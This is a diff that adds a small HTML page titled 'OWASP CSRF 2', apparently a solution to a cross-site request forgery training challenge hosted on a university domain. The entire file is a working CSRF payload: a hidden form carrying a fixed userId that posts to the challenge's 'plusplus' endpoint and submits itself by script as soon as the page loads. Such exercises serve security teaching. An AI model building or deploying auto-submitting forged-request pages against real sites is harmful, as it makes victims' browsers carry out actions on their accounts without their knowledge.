@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>OWASP CSRF 2</title>
+  </head>
+
+  <body>
+    <p>prout</p>
+    <form name="tainted" action="https://owasp02.isc.heia-fr.ch/user/csrfchallengetwo/plusplus" method="POST">
+      <input type="hidden" name="userId" value="7d121bb2a07e35d0e674e06f40e33082663d80fd" />
+      <input type="submit"/> 
+    </form> 
+    <script> document.tainted.submit(); </script>
+  </body>
+</html>
